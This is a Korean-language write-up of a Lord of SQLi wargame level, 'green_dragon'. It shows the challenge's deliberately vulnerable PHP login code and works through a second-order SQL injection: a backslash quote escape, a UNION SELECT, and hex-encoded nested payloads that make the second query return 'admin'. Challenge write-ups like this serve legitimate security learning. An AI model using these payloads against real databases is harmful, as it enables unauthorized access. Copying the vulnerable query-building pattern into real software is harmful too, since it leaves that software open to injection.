---
title : "LOS Lv.25 green_dragon"
categories : [Wargame, rubiya]
---


## green_dragon
```php
query : select id,pw from prob_green_dragon where id='' and pw=''

<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\'|\"/i', $_GET[id])) exit("No Hack ~_~");
  if(preg_match('/prob|_|\.|\'|\"/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id,pw from prob_green_dragon where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if($result['id']){
    if(preg_match('/prob|_|\.|\'|\"/i', $result['id'])) exit("No Hack ~_~");
    if(preg_match('/prob|_|\.|\'|\"/i', $result['pw'])) exit("No Hack ~_~");
    $query2 = "select id from prob_green_dragon where id='{$result[id]}' and pw='{$result[pw]}'";
    echo "<hr>query2 : <strong>{$query2}</strong><hr><br>";
    $result = mysqli_fetch_array(mysqli_query($db,$query2));
    if($result['id'] == "admin") solve("green_dragon");
  }
  highlight_file(__FILE__);
?>

```

## Solution
```sql
select id,pw from prob_green_dragon where id='\' and pw=' union select \,  or id=0x61646D696E # #'
```
```
값은 hex로 바꿔서 줄꺼고 저렇게 만들어 주면 
이제 쿼리2에서 아래처럼 되서 admin을 가져올꺼임.
```
```sql
# 예상 결과
query : select id,pw from prob_green_dragon where id='\' and pw='union select 0x5C,0x206F722069643D3078363136343644363936452023 #'

query2 : select id from prob_green_dragon where id='\' and pw=' or id=0x61646D696E #'
```
```sql
select id from prob_green_dragon where id='\' and pw=' or id=0x61646D696E #'
```
```
하지만 클리어가 되지 않음. 

즉, 이 테이블에 id,pw값에 admin 값이 없다는 의미임. 
따라서 우리가 테이블에 admin 값을 넣어줘야 함.
```
우리는 query2를 다음처럼 만들어야 함.
```sql
query2 : select id from prob_green_dragon where id='\' and pw=' union select 0x61646D696E #'
```
따라서 입력값은 아래와 같음.
```sql
?id=\&pw=union%20select%200x5C,0x20756E696F6E2073656C656374203078363136343644363936452023%20%23

select id,pw from prob_green_dragon where id='\' and pw='union select 0x5C,0x20756E696F6E2073656C656374203078363136343644363936452023 #
```

